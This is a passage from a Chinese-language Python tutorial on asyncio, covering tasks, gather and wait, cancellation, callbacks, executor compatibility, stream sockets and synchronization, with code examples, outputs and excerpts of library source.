ConnectionError

BrokenPipeError
ConnectionAbortedError
ConnectionRefusedError
ConnectionResetError


FileExistsError
FileNotFoundError
InterruptedError
IsADirectoryError
NotADirectoryError
PermissionError
ProcessLookupError
TimeoutError：系统函数执行超时时触发


ReferenceError：引用错误（对象被资源回收或者删除了）
RuntimeError：出错了，但是检测不到错误类别时触发

NotImplementedError：为实现报错（比如调用了某个不存在的子类方法）
RecursionError：递归程度太深引发的异常
asyncio.SendfileNotAvailableError：系统调用不适用于给定的套接字或文件类型


SyntaxError：语法错误时引发（粘贴代码经常遇到）

IndentationError：缩进有问题
TabError：当缩进包含不一致的制表符和空格使用时引发


SystemError
TypeError：类型错误
ValueError

UnicodeError
UnicodeDecodeError
UnicodeEncodeError
UnicodeTranslateError


Warning
DeprecationWarning
PendingDeprecationWarning
RuntimeWarning
SyntaxWarning
UserWarning
FutureWarning
ImportWarning
UnicodeWarning
BytesWarning
ResourceWarning







 


新语法的说明¶
Net方向的同志记得对比当时写的 Python3 与 C# 并发编程之～Net篇：https://www.cnblogs.com/dunitian/p/9419325.html
1.概念¶
先说说概念：

event_loop事件循环：

程序开启一个无限的循环，程序员会把一些函数（协程）注册到事件循环上
当满足事件发生的时候，调用相应的协程函数


coroutine协程：

协程对象，指一个使用async关键字定义的函数，它的调用不会立即执行函数，而是会返回一个协程对象
协程对象需要注册到事件循环，由事件循环调用


future对象：

代表将来执行或没有执行的任务的结果（它和task上没有本质的区别）


task任务：

一个协程对象就是一个原生可以挂起的函数，Task则是对协程进一步封装，其中包含任务的各种状态
Task对象是Future的子类，它将coroutine和Future联系在一起，将coroutine封装成一个Future对象


async/await关键字：

定义协程的关键字，async定义一个协程，await用于挂起阻塞的异步调用接口
类似于yield from（都是在调用方与子协程之间直接建立一个双向通道）



2.语法¶
为了避免读者混乱于新旧代码的使用，从下面开始就直接使用最新的语法的

运行asyncio：asyncio.run(main())

只运行一次(if __name__ == "__main__")


创建一个任务：asyncio.create_task(func())

Python3.8会多一个name的别名参数


批量执行任务：asyncio.gather(*tasks)

return_exceptions=True可以屏蔽这批任务的异常，并把异常结果返回
如果有类似于(第一个任务完成|第一个异常产生后)进行相应的操作，则推荐asyncio.wait


获取loop：asyncio.get_event_loop()

优先考虑：asyncio.get_running_loop()（获取不到会抛异常）




# 如果和旧版本混用，就应该这么写了（麻烦）
try:
    loop = asyncio.get_running_loop()
except RuntimeError as ex:
    print(ex) # no running event loop
    loop = asyncio.get_event_loop()
...
loop.run_until_complete(xxx)


新语法：

async def main():
    loop = asyncio.get_running_loop()
    ...

asyncio.run(main())


3.状态¶
Task基本上就是这几个状态（生成器、Future也是）：

Pending：创建Task，还未执行
Running：事件循环正在调用执行任务
Done：Task执行完毕
Cancelled：Task被取消后的状态

4.时序图¶
Python3.7之前官方贴了张时序图，我们拿来理解上面的话：https://docs.python.org/3.6/library/asyncio-task.html

import asyncio

async def compute(x, y):
    print(f"计算 {x}+{y}...")
    await asyncio.sleep(1.0)
    return x + y

async def main(x, y):
    result = await compute(x, y)
    print(f"{x}+{y}={result}")

loop = asyncio.get_event_loop()
loop.run_until_complete(main(1, 2))
loop.close()



3.5.4.回调函数（新用法）¶
和旧版本比起来其实就是创建一个task，然后为task添加一个回调函数add_done_callback

import asyncio

async def get_html(url):
    print(f"get {url} ing")
    await asyncio.sleep(2)
    return f"<h1>This is a test for {url}</h1>"

def callback_func(task):
    print(type(task))
    if task.done():
        print(f"done")  # print(task.result())

async def main():
    urls = [
        "https://www.baidu.com", "https://www.asp.net",
        "https://www.python.org", "https://www.sogou.com"
    ]
    # asyncio.create_task来创建一个Task
    tasks = [asyncio.create_task(get_html(url)) for url in urls]
    # 给每个任务都加一个回调函数
    for task in tasks:
        task.add_done_callback(callback_func)
    # 批量执行任务
    result = await asyncio.gather(*tasks)
    print(result)  # 返回 result list

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
get https://www.baidu.com ing
get https://www.asp.net ing
get https://www.python.org ing
get https://www.sogou.com ing
<class '_asyncio.Task'>
done
<class '_asyncio.Task'>
done
<class '_asyncio.Task'>
done
<class '_asyncio.Task'>
done
['<h1>This is a test for https://www.baidu.com</h1>', '<h1>This is a test for https://www.asp.net</h1>', '<h1>This is a test for https://www.python.org</h1>', '<h1>This is a test for https://www.sogou.com</h1>']
2.0189685821533203
注意：`add_signal_handler`是loop独有的方法，Task中没有，eg：loop.add_signal_handler(signal.SIGINT, callback_handle, *args)
3.5.5.异常相关扩展¶
关于批量任务的异常处理：

默认：同一批次有一个task产生了异常，这一批次任务就全部结束了
return_exceptions=True:不影响其他任务，异常消息也放在结果列表中
当gather被取消的时候，不管True or False，这批次任务全部取消


import asyncio

async def get_html(url):
    print(f"get {url} ing")
    if url == "https://www.asp.net":
        raise Exception("Exception is over")
    await asyncio.sleep(2)
    return f"<h1>This is a test for {url}</h1>"

def callback_func(task):
    if task.done():
        print(f"done")  # print(task.result())

async def main():
    urls = [
        "https://www.baidu.com", "https://www.asp.net",
        "https://www.python.org", "https://www.sogou.com"
    ]
    # asyncio.create_task来创建一个Task
    tasks = [asyncio.create_task(get_html(url)) for url in urls]
    # 给每个任务都加一个回调函数
    for task in tasks:
        task.add_done_callback(callback_func)
    # 批量执行任务
    result = await asyncio.gather(*tasks, return_exceptions=True)
    print(result)  # 返回 result list

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
get https://www.baidu.com ing
get https://www.asp.net ing
get https://www.python.org ing
get https://www.sogou.com ing
done
done
done
done
['<h1>This is a test for https://www.baidu.com</h1>', Exception('Exception is over'), '<h1>This is a test for https://www.python.org</h1>', '<h1>This is a test for https://www.sogou.com</h1>']
2.013272523880005
3.5.6.任务分组、取消¶
1.分组¶
看个简单的任务分组案例：

import asyncio

async def get_html(url):
    print(f"get url for{url}")
    await asyncio.sleep(2)
    return f"<h1>This is a test for {url}</h1>"

async def main():
    urls1 = ["https://www.baidu.com", "https://www.asp.net"]
    urls2 = ["https://www.python.org", "https://www.sogou.com"]

    tasks1 = [asyncio.create_task(get_html(url)) for url in urls1]
    tasks2 = [asyncio.create_task(get_html(url)) for url in urls2]

    # 等待两组都完成，然后返回聚合结果
    result = await asyncio.gather(*tasks1, *tasks2)
    print(result)

if __name__ == "__main__":
    import time
    start_time = time.time()

    try:
        asyncio.run(main())
    except Exception as ex:
        print(ex)

    print(time.time() - start_time)


输出：(两个分组结果被一起放到了list中)
get url forhttps://www.baidu.com
get url forhttps://www.asp.net
get url forhttps://www.python.org
get url forhttps://www.sogou.com
['<h1>This is a test for https://www.baidu.com</h1>', '<h1>This is a test for https://www.asp.net</h1>', '<h1>This is a test for https://www.python.org</h1>', '<h1>This is a test for https://www.sogou.com</h1>']
2.0099380016326904
2.取消¶
如果想要对Group1和Group2进行更多的自定化，可以再包裹一层gather方法：

import asyncio

async def get_html(url):
    print(f"get url for{url}")
    await asyncio.sleep(2)
    return f"<h1>This is a test for {url}</h1>"

async def main():
    urls1 = ["https://www.baidu.com", "https://www.asp.net"]
    urls2 = ["https://www.python.org", "https://www.sogou.com"]

    tasks1 = [asyncio.create_task(get_html(url)) for url in urls1]
    tasks2 = [asyncio.create_task(get_html(url)) for url in urls2]

    group1 = asyncio.gather(*tasks1)
    group2 = asyncio.gather(*tasks2)

    # 分组2因为某原因被取消任务了（模拟）
    group2.cancel()

    # 等待两组都完成，然后返回聚合结果
    result = await asyncio.gather(group1, group2, return_exceptions=True)
    print(result)

if __name__ == "__main__":
    import time
    start_time = time.time()

    try:
        asyncio.run(main())
    except Exception as ex:
        print(ex)

    print(time.time() - start_time)


输出：
get url forhttps://www.baidu.com
get url forhttps://www.asp.net
[['<h1>This is a test for https://www.baidu.com</h1>', '<h1>This is a test for https://www.asp.net</h1>'], CancelledError()]
2.0090348720550537
再看个单个任务的案例：

import asyncio

async def test():
    print("start...")
    await asyncio.sleep(10)
    print("end...")

async def main():
    task = asyncio.create_task(test())

    await asyncio.sleep(1)

    # 取消task任务
    task.cancel()

    try:
        await task
    except asyncio.CancelledError:
        print(f"任务已经被取消：{task.cancelled()}")
        print(f"任务是因为异常而完成：{task.done()}")

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
start...
任务已经被取消：True
任务是因为异常而完成：True
1.0133979320526123
简单说明下：

task.done()：任务是否完成

任务完成：task.done() ==> true：
任务正常完成
触发异常而被标记为任务完成



task.cancelled()：用来判断是否成功取消

为什么这么说？看看源码：

# 完成包含了正常+异常
if outer.done():
    # 把因为异常完成的任务打个标记
    if not fut.cancelled():
        fut.exception() # 标记检索的异常


PS：官方推荐asyncio.all_tasks(loop中尚未完成的Task集合):

原来是通过：asyncio.Task.all_tasks来获取(返回loop的所有Task集合)

wait_for and wait¶
1.一个任务限时等待(wait_for)¶
超时等待：asyncio.wait_for(task, timeout)

import asyncio

async def test(time):
    print("start...")
    await asyncio.sleep(time)
    print("end...")
    return time

async def main():
    task = asyncio.create_task(test(3))
    try:
        result = await asyncio.wait_for(task, timeout=2)
        print(result)
    except asyncio.CancelledError:
        print("Cancel")
    except asyncio.TimeoutError:
        print("超时取消")
    except Exception as ex:
        print(ex)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
start...
超时取消
2.007002115249634
2.多个任务限时等待(wait)¶
wait是比gather更底层的api，比如现在这个多任务限时等待gather并不能满足:

import asyncio

async def test(time):
    print("start...")
    await asyncio.sleep(time)
    print("end...")
    return time

async def main():
    tasks = [asyncio.create_task(test(i)) for i in range(10)]

    # 已完成的任务（包含异常），未完成的任务
    done, pending = await asyncio.wait(tasks, timeout=2)
    # 任务总数（我用了3种表示）PS：`all_tasks()`的时候记得去除main的那个
    print(
        f"任务总数：{len(tasks)}=={len(done)+len(pending)}=={len(asyncio.Task.all_tasks())-1}"
    )
    # 所有未完成的task：asyncio.all_tasks()，记得去掉run(main())
    print(f"未完成Task:{len(pending)}=={len(asyncio.all_tasks()) - 1}")

    print(await asyncio.gather(*done))
    # for task in done:
        # print(await task)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
start...
start...
start...
start...
start...
start...
start...
start...
start...
start...
end...
end...
end...
任务总数：10==10==10
未完成Task:7==7
[0, 1, 2]
2.0071778297424316
wait的扩展¶
用法其实和Future一样（https://www.cnblogs.com/dotnetcrazy/p/9528315.html#Future对象），这边就当再普及下新语法了
第一个任务执行完成则结束此批次任务¶
项目里经常有这么一个场景：同时调用多个同效果的API，有一个返回后取消其他请求,看个引入案例

import asyncio

async def test(i):
    print(f"start...task{i}")
    await asyncio.sleep(i)
    print(f"end...task{i}")
    return "ok"

# 第一个任务执行完成则结束此批次任务
async def main():
    tasks = [asyncio.create_task(test(i)) for i in range(10)]

    # 项目里经常有这么一个场景：同时调用多个同效果的API，有一个返回后取消其他请求
    done, pending = await asyncio.wait(
        tasks, return_when=asyncio.FIRST_COMPLETED)

    # print(await asyncio.gather(*done))
    for task in done:
        print(await task)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
start...task0
start...task1
start...task2
start...task3
start...task4
start...task5
start...task6
start...task7
start...task8
start...task9
end...task0
ok
0.017002105712890625
课后拓展：(asyncio.shield保护等待对象不被取消) https://docs.python.org/3/library/asyncio-task.html#shielding-from-cancellation
下级预估：旧代码兼容、同步语、Socket新用




 


代码答疑¶
之前有人问我，这个asyncio.get_running_loop()到底是用还是不用？为什么一会asyncio.get_event_loop()一会又是asyncio.get_running_loop()，一会是loop.run_until_complete()一会又是asyncio.run()的，有点混乱了。
之前逆天简单的提了一下，可能说的还是不太详细，这边再举几个例子说说：
首先：如果你用的是Python3.7之前的版本，那么你用不到loop = asyncio.get_running_loop()和asyncio.run()的
如果是老版本你就使用asyncio.get_event_loop()来获取loop，用loop.run_until_complete()来运行：

import asyncio

async def test():
    print("start ...")
    await asyncio.sleep(2)
    print("end ...")

# 如果你用`get_running_loop`就不要和`loop.run_until_complete`混用
loop = asyncio.get_event_loop()
loop.run_until_complete(test())


输出：（混用需要捕获Runtime的异常）
start ...
end ...
上节课说使用asyncio.get_running_loop()麻烦的情景是这个：（这种情况倒不如直接asyncio.get_event_loop()获取loop了）

# 如果和旧版本混用，就应该这么写了（麻烦）
try:
    loop = asyncio.get_running_loop()
except RuntimeError as ex:
    loop = asyncio.get_event_loop()
...
asyncio.run(test())


官方推荐的新语法是这样的：(>=Python3.7)

async def main():
    loop = asyncio.get_running_loop()
    ...

asyncio.run(main())


PS：记住一句就行：asyncio.get_running_loop()和asyncio.run()成对出现
可以这么理解：asyncio.run里会创建对应的loop，所以你才能获取正在运行的loop：

# https://github.com/lotapp/cpython3/blob/master/Lib/asyncio/runners.py
def run(main, *, debug=False):
    if events._get_running_loop() is not None:
        raise RuntimeError("无法从正在运行的事件循环中调用asyncio.run()")

    if not coroutines.iscoroutine(main):
        raise ValueError("{!r}应该是一个协程".format(main))

    # 创建一个新的事件循环
    loop = events.new_event_loop()
    try:
        events.set_event_loop(loop) # 设置事件循环
        loop.set_debug(debug) # 是否调试运行（默认否）
        return loop.run_until_complete(main) # 等待运行
    finally:
        try:
            _cancel_all_tasks(loop) # 取消其他任务
            loop.run_until_complete(loop.shutdown_asyncgens())
        finally:
            events.set_event_loop(None)
            loop.close()


就是怕大家混乱，上节课开始就直接使用的最新语法，旧语法文章里尽量不使用了，本节也是
3.5.7.兼容旧代码 or 运行阻塞代码¶
部分可以参考官方文档：https://docs.python.org/3/library/asyncio-eventloop.html
学了协程GIL的问题其实也不是多大的事情了，多进程+协程就可以了，asyncio现在也提供了线程安全的run方法：asyncio.run_coroutine_threadsafe(coro)（也算是对GIL给出的官方解决方法了）
1.协程 and 线程池¶
前面我们说过了并发编程（线程+进程）的通用解决方案：并发编程：concurrent.futures专栏
asyncio框架虽然几乎包含了所有常用功能，但毕竟是新事物，旧代码怎么办？协程只是单线程工作，理论上不能使用阻塞代码，那库或者api只能提供阻塞的调用方式怎么办？ ~ 不用慌，可以使用官方提供的兼容方法，先看个案例：
1.回顾下一起的通用方案：¶

import asyncio
import concurrent.futures

# 模拟一个耗时操作
def test(n):
    return sum(i * i for i in range(10**n))

# old main
def main():
    with concurrent.futures.ThreadPoolExecutor() as pool:
        # 注意：future和asyncio.future是不一样的
        future = pool.submit(test, 7)
        result = future.result()
        print(result)

if __name__ == "__main__":
    import time

    start_time = time.time()

    main()  # old

    print(time.time() - start_time)


输出：（注意：future和asyncio.future不是一个东西，只是类似而已）
333333283333335000000
15.230607032775879
2.兼容版新用法：¶

import asyncio
import concurrent.futures


# 模拟一个耗时操作
def test(n):
    return sum(i * i for i in range(10**n))

async def main():
    # 获取loop
    loop = asyncio.get_running_loop()

    with concurrent.futures.ThreadPoolExecutor() as pool:
        # 新版兼任代码
        result = await loop.run_in_executor(pool, test, 7)
        print(result)


if __name__ == "__main__":
    import time

    start_time = time.time()

    asyncio.run(main())  # new

    print(time.time() - start_time)


输出：（不谈其他的，至少运行速度快了）
333333283333335000000
15.283994913101196
源码分析¶
我们来看看run_in_executor的内部逻辑是啥：

class BaseEventLoop(events.AbstractEventLoop):
    def run_in_executor(self, executor, func, *args):
        # 检查loop是否关闭，如果关闭就抛`RuntimeError`异常
        self._check_closed()
        if self._debug:
            self._check_callback(func, 'run_in_executor')
        # 如果不传一个executor,就会使用默认的executor
        # 换句话说：你可以不传`线程池`
        if executor is None:
            executor = self._default_executor
            if executor is None:
                executor = concurrent.futures.ThreadPoolExecutor()
                self._default_executor = executor
        # 把`concurrent.futures.Future`对象封装成`asyncio.futures.Future`对象
        return futures.wrap_future(executor.submit(func, *args), loop=self)


看完源码就发现，代码还可以进一步简化：

import asyncio

# 模拟一个耗时操作
def test(n):
    return sum(i * i for i in range(10**n))

async def main():
    # 获取loop
    loop = asyncio.get_running_loop()

    # 新版兼任代码
    result = await loop.run_in_executor(None, test, 7)
    print(result)

if __name__ == "__main__":
    import time

    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
333333283333335000000
15.367998838424683
PS：协程里面不应该出现传统的阻塞代码，如果只能用那些代码，那么这个就是一个兼任的措施了
2.回调扩展¶
这个没有之前讲的那些常用，就当了解下，框架里面碰到不至于懵逼：

Task执行完后执行：add_done_callback(回调函数)

task.add_done_callback() or loop.add_done_callback()
想要传参数可以使用：functools.partial(call_back, url)
PS：通过偏函数传过来的参数在最前面：call_back(url,task)


尽快执行：call_soon(callback,*args)

loop.call_soon()、线程安全：loop.call_soon_threadsafe()
可以看成是loop.call_later(0,callback,*args)
一般临时插入一个任务的时候会用到


指定时间后执行：loop.call_later(delay,callback,*args)

延迟可以是int或float，以秒为单位（相对于当前时间）
返回的对象可以使用cancel()方法来取消任务


指定协程时间后执行：loop.call_at(绝对时间,callback,*args)

和call_later差不多，时间使用绝对时间(这个绝对时间是loop的time()方法)



注意点：首先要保证任务执行前loop不断开，比如你call_later(2,xxx)，这时候loop退出了，那么任务肯定完成不了
这个比较简单，看个案例：

import asyncio

def test(name):
    print(f"start {name}...")
    print(f"end {name}...")

async def main():
    # 正在执行某个任务
    loop = asyncio.get_running_loop()

    # 插入一个更要紧的任务
    # loop.call_later(0, callback, *args)
    task1 = loop.call_soon(test, "task1")

    # 多少秒后执行
    task2 = loop.call_later(2, test, "task2")

    # 内部时钟时间
    task3 = loop.call_at(loop.time() + 3, test, "task3")

    print(type(task1))
    print(type(task2))
    print(type(task3))

    # 保证loop在执行完毕后才关闭
    await asyncio.sleep(5)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：(回调函数一般都是普通函数)
<class 'asyncio.events.Handle'>
<class 'asyncio.events.TimerHandle'>
<class 'asyncio.events.TimerHandle'>
start task1...
end task1...
start task2...
end task2...
start task3...
end task3...
4.9966819286346436
PS：关于返回值的说明可以看官方文档：https://docs.python.org/3/library/asyncio-eventloop.html#callback-handles
然后说下call_later（这个执行过程会按照时间排个先后顺序，然后再批次运行）

import asyncio

# 回调函数一般都是普通函数
def test(name):
    print(name)

if __name__ == "__main__":
    import time
    start_time = time.time()

    loop = asyncio.get_event_loop()

    # 新版本限制了时间不能超过24h（防止有些人当定时任务来乱用）
    # 这个执行过程会安装时间排个先后顺序，然后再批次运行
    task4 = loop.call_later(4, test, "task2-4")
    task2 = loop.call_later(2, test, "task2-2")
    task3 = loop.call_later(3, test, "task2-3")
    task1 = loop.call_later(1, test, "task2-1")
    # 取消测试
    task4.cancel()
    # close是直接丢弃任务然后关闭loop
    loop.call_later(4, loop.stop)  # 等任务执行完成结束任务 loop.stop()

    # run内部运行的是run_until_complete，而run_until_complete内部运行的是run_forever
    loop.run_forever()
    print(time.time() - start_time)


输出：（asyncio.get_running_loop()不要和旧代码混用）
task2-1
task2-2
task2-3
4.009201526641846
PS：run内部运行的是run_until_complete，而run_until_complete内部运行的是run_forever




 


Task答疑¶
从开始说新语法之后，我们创建任务都直接用asyncio.create_task来包裹一层，有人问我这个Task除了是Future的子类外，有啥用？为啥不直接使用Future呢？貌似也没语法啊？
看一个案例：

import asyncio

# 不是协程就加个装饰器
@asyncio.coroutine
def test():
    print("this is a test")

async def test_async():
    print("this is a async test")
    await asyncio.sleep(1)

async def main():
    # 传入一个协程对象，返回一个task
    task1 = asyncio.create_task(test())
    task2 = asyncio.create_task(test_async())
    await asyncio.gather(task1, task2)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
this is a test
this is a async test
1.0070011615753174
我们来看看asyncio.create_task的源码：（关键在Task类）

# 传入一个协程对象，返回一个Task对象
def create_task(self, coro):
    self._check_closed()
    if self._task_factory is None:
        # look：核心点
        task = tasks.Task(coro, loop=self)
        if task._source_traceback:
            del task._source_traceback[-1]
    else:
        task = self._task_factory(self, coro)
    return task


看看核心类Task：

class Task(futures._PyFuture):
    def __init__(self, coro, *, loop=None):
        super().__init__(loop=loop)
        ...
        # 安排了一个尽快执行的回调方法：self.__step
        self._loop.call_soon(self.__step, context=self._context)

    def __step(self, exc=None):
       try:
            if exc is None:
                # 协程初始化（生成器或者协程初始化 next(xxx））
                result = coro.send(None)
            else:
                result = coro.throw(exc)
        except StopIteration as exc:
            if self._must_cancel:
                # 在停止之前取消任务
                self._must_cancel = False
                super().set_exception(futures.CancelledError())
            else:
                # 拿到了协程/生成器的结果
                super().set_result(exc.value)
        except futures.CancelledError:
            super().cancel()  # I.e., Future.cancel(self).
        except Exception as exc:
            super().set_exception(exc)
        except BaseException as exc:
            super().set_exception(exc)
            raise
    ...


PS：那么很明显了，Task的作用就类似于future和协程的中间人了（屏蔽某些差异）
3.5.8.Socket新用法¶
官方文档：https://docs.python.org/3/library/asyncio-stream.html
asyncio实现了TCP、UDP、SSL等协议，aiohttp则是基于asyncio实现的HTTP框架，我们简单演示一下（PS：网络通信基本上都是使用aiohttp）
1.简单案例¶
服务端：

import asyncio

async def handler(client_reader, client_writer):
    # 没有数据就阻塞等（主线程做其他事情去了）
    data = await client_reader.read(2048)
    print(data.decode("utf-8"))

    client_writer.write("骊山语罢清宵半,泪雨霖铃终不怨\n何如薄幸锦衣郎,比翼连枝当日愿".encode("utf-8"))
    await client_writer.drain()  # 等待缓冲区（缓冲区没占满就直接返回）
    client_writer.close()  # 关闭连接

async def main():
    server = await asyncio.start_server(handler, "127.0.0.1", 8080)
    print("Server已经启动，端口：8080")
    # 实现了协程方法`__aenter__`和`__aexit__`的可以使用`async with`
    async with server:
        # async def serve_forever(self):pass ==> use await
        await server.serve_forever()  # 异步方法

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


客户端：

import asyncio

async def main():
    reader, writer = await asyncio.open_connection("127.0.0.1", 8080)
    writer.write("人生若只如初见,何事秋风悲画扇\n等闲变却故人心,却道故人心易变".encode("utf-8"))
    data = await reader.read(2048)
    if data:
        print(data.decode("utf-8"))

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出图示： 
2.HTTP案例¶
再举个HTTP的案例：

import asyncio

async def get_html(host):
    print("get_html %s..." % host)
    reader, writer = await asyncio.open_connection(host, 80)
    writer.write(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode('utf-8'))
    await writer.drain()  # 等待缓冲区

    html_list = []
    async for line in reader:
        html_list.append(line.decode("utf-8"))

    writer.close()  # 关闭连接
    return "\n".join(html_list)

async def main():
    tasks = [
        asyncio.create_task(get_html(url))
        for url in ['dotnetcrazy.cnblogs.com', 'dunitian.cnblogs.com']
    ]
    html_list = await asyncio.gather(*tasks)
    print(html_list)

if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(time.time() - start_time)


输出：
get_html dotnetcrazy.cnblogs.com...
get_html dunitian.cnblogs.com...
[html内容省略,html内容省略]
5.092018604278564
GIF过程图： 
PS：（后面会继续说的）

实现了协程方法__anext__的可以使用async for
实现了协程方法__aenter__和__aexit__的可以使用async with

3.源码分析¶
还记得之前IO多路复用的时候自己写的非阻塞Server不，简单梳理下流程，然后咱们再一起看看asyncio对应的源码：

设置Socket为非阻塞（socket.setblocking(False)）
利用轮询用来监视文件描述符fd（register）
对可读写的socket进行相应操作
取消轮询的监听（unregister）

看看await asyncio.open_connection(ip,port)的源码：

# asyncio.streams.py
async def open_connection(host=None, port=None, *, loop=None, limit=_DEFAULT_LIMIT, **kwds):
    if loop is None:
        loop = events.get_event_loop()
    reader = StreamReader(limit=limit, loop=loop)
    protocol = StreamReaderProtocol(reader, loop=loop)
    # 核心点
    transport, _ = await loop.create_connection(lambda: protocol, host, port, **kwds)
    writer = StreamWriter(transport, protocol, reader, loop)
    return reader, writer


发现，其实内部核心在loop.create_connection中

# asyncio.base_events.py
# 连接TCP服务器
class BaseEventLoop(events.AbstractEventLoop):
    async def create_connection(self,
                                protocol_factory,
                                host=None,
                                port=None,
                                *,
                                ssl=None,
                                family=0,
                                proto=0,
                                flags=0,
                                sock=None,
                                local_addr=None,
                                server_hostname=None,
                                ssl_handshake_timeout=None):
        ...
        # 主要逻辑
        if host is not None or port is not None:
            exceptions = []
            # 主要逻辑
            for family, type, proto, cname, address in infos:
                try:
                    sock = socket.socket(family=family, type=type, proto=proto)
                    sock.setblocking(False) # 1.设置非阻塞 <<<< look
                    if local_addr is not None:
                        for _, _, _, _, laddr in laddr_infos:
                            try:
                                sock.bind(laddr) # 端口绑定
                                break
                            except OSError as exc:
                                msg = (f'error while attempting to bind on '
                                       f'address {laddr!r}: '
                                       f'{exc.strerror.lower()}')
                                exc = OSError(exc.errno, msg)
                                exceptions.append(exc)
                        else:
                            sock.close()
                            sock = None
                            continue
                    if self._debug:
                        logger.debug("connect %r to %r", sock, address)
                    # 在selector_events中
                    await self.sock_connect(sock, address) # <<< look
                except OSError as exc:
                    if sock is not None:
                        sock.close()
                    exceptions.append(exc)
                except:
                    if sock is not None:
                        sock.close()
                    raise
                else:
                    break


发现源码中设置了socket为非阻塞，调用了sock_connect

async def sock_connect(self, sock, address):
        """连接远程socket地址(协程方法)"""
        # 非阻塞检查
        if self._debug and sock.gettimeout() != 0:
            raise ValueError("the socket must be non-blocking")
        ...
        fut = self.create_future()
        self._sock_connect(fut, sock, address)
        return await fut

def _sock_connect(self, fut, sock, address):
        fd = sock.fileno() # 获取socket的文件描述符 <<< look
        try:
            sock.connect(address)
        except (BlockingIOError, InterruptedError):
            # 设置future的回调函数_sock_connect_done（用来注销的）<<< look
            fut.add_done_callback(functools.partial(self._sock_connect_done, fd))
            # 注册selector.register
            self.add_writer(fd, self._sock_connect_cb, fut, sock, address)
        except Exception as exc:
            fut.set_exception(exc)
        else:
            fut.set_result(None)


先看下sock_connect中调用的add_writer(注册)

def add_writer(self, fd, callback, *args):
    """添加一个写的回调"""
    self._ensure_fd_no_transport(fd)
    return self._add_writer(fd, callback, *args)

def _add_writer(self, fd, callback, *args):
        self._check_closed()
        handle = events.Handle(callback, args, self, None)
        try:
            key = self._selector.get_key(fd)
        except KeyError:
            self._selector.register(fd, selectors.EVENT_WRITE,
                                    (None, handle)) # selector.register
        else:
            mask, (reader, writer) = key.events, key.data
            self._selector.modify(fd, mask | selectors.EVENT_WRITE,
                                  (reader, handle))
            if writer is not None:
                writer.cancel()


再看下sock_connect中设置的回调函数_sock_connect_done（注销）

def _sock_connect_done(self, fd, fut):
    # 取消注册selector.unregister
    self.remove_writer(fd)

def remove_writer(self, fd):
    """移除写的回调"""
    self._ensure_fd_no_transport(fd)
    return self._remove_writer(fd)

def _remove_writer(self, fd):
    if self.is_closed():
        return False
    try:
        key = self._selector.get_key(fd)
    except KeyError:
        return False
    else:
        mask, (reader, writer) = key.events, key.data
        mask &= ~selectors.EVENT_WRITE
        if not mask:
            self._selector.unregister(fd) # 注销 <<< look
        else:
            self._selector.modify(fd, mask, (reader, None))

        if writer is not None:
            writer.cancel()
            return True
        else:
            return False


PS：嵌套的非常深，而且底层代码一致在变（Python3.6到Python3.7这个新小更新就变化很大）
关于源码的说明¶
之前并发编程的基础知识已经讲的很清楚了，也分析了很多源码，你可以自己去拓展一下（Python3的asyncio模块的源码一直在优化改进的路上）我这边就不一一分析了(源码很乱，估计几个版本后会清晰，现在是多层混套用)，你可以参考部分源码解析：https://github.com/lotapp/cpython3/tree/master/Lib/asyncio 
课后拓展：
https://docs.python.org/3/library/asyncio-protocol.html#examples
https://docs.python.org/3/library/asyncio-eventloop.html#creating-network-servers
下节预估：同步与通信、aiohttp版爬虫




 


3.5.9.同步与通信¶
官方文档：
https://docs.python.org/3/library/asyncio-sync.html
https://docs.python.org/3/library/asyncio-queue.html
写在前面：

下面的方式不是线程安全的（协程就一个线程）
这些同步原语的方法不接受超时参数; 使用asyncio.wait_for(协程方法,超时时间)函数执行超时操作
asyncio具有以下基本同步原语：Lock、Event、Condition、Semaphore、BoundedSemaphore

1.引导示例¶
1.1.old code¶
先看个原来的引导案例：估计的结果是0，而不借助lock得出的结果往往出乎意料

import concurrent.futures

num = 0

def test(i):
    global num
    for _ in range(10000000):
        num += i

def main():
    with concurrent.futures.ThreadPoolExecutor() as executor:
        print("start submit...")
        future1 = executor.submit(test, 1)
        future2 = executor.submit(test, -1)
        concurrent.futures.wait([future1, future2])  # wait some time
        print("end submit...")
    global num
    print(num)

if __name__ == "__main__":
    import time
    start_time = time.time()
    main()
    print(f"time:{time.time()-start_time}")


输出：(但是代码并不是线程安全的，所以结果往往不是我们想要的）
start submit...
end submit...
82705
time:5.032064199447632
1.2.new code¶
再看看协程的案例：

import asyncio

num = 0

async def test(i):
    global num
    for _ in range(10000000):
        num += i

async def main():
    print("start tasks...")
    task1 = asyncio.create_task(test(1))
    task2 = asyncio.create_task(test(-1))
    await asyncio.gather(task1, task2)
    print("end tasks...")

    global num
    print(num)


if __name__ == "__main__":
    import time
    start_time = time.time()

    asyncio.run(main())

    print(f"time:{time.time()-start_time}")


输出：（就一个线程，当然安全）
start tasks...
end tasks...
0
time:4.860997438430786
1.3.注意点¶
PS：你使用协程的兼容代码，并不能解决线程不安全的问题
import asyncio
import concurrent.futures

num = 0

def test(i):
    global num
    for _ in range(10000000):
        num += i

async def main():
    # 获取当前loop
    loop = asyncio.get_running_loop()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        print("start submit...")
        future1 = loop.run_in_executor(executor, test, 1)
        future2 = loop.run_in_executor(executor, test, -1)
        # await asyncio.wait([future1,future2])
        await asyncio.gather(future1, future2)
        print("end submit...")
    global num
    print(num)

if __name__ == "__main__":
    import time
